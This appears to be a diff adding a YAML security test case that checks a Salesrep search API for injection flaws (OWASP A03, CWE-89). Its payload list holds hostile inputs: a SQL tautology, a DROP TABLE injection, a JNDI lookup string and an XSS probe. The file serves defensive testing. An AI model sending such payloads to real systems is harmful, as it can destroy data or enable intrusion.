@@ -1,0 +1,19 @@
+# sec-028-salesrep-a03-injection: Salesrep: A03 Injection in search
+id: sec-028-salesrep-a03-injection
+title: "Salesrep: A03 Injection in search"
+module: sales-territories
+table: Salesrep
+owasp: "A03:2021 Injection"
+cwe: CWE-89
+severity: high
+target:
+  method: GET
+  path: "/api/sales-territories/salesreps?q="
+payloads:
+  - "' OR '1'='1"
+  - "\"; DROP TABLE Salesrep; --"
+  - "${jndi:ldap://x}"
+  - "<script>alert(1)</script>"
+expected: "200 with an empty or filtered page; SalesRep search is parameterised; no stack trace"
+legacy_reference: legacy/sales-territories/si_salesrep.p
+automated_by: zap-baseline + custom request runner
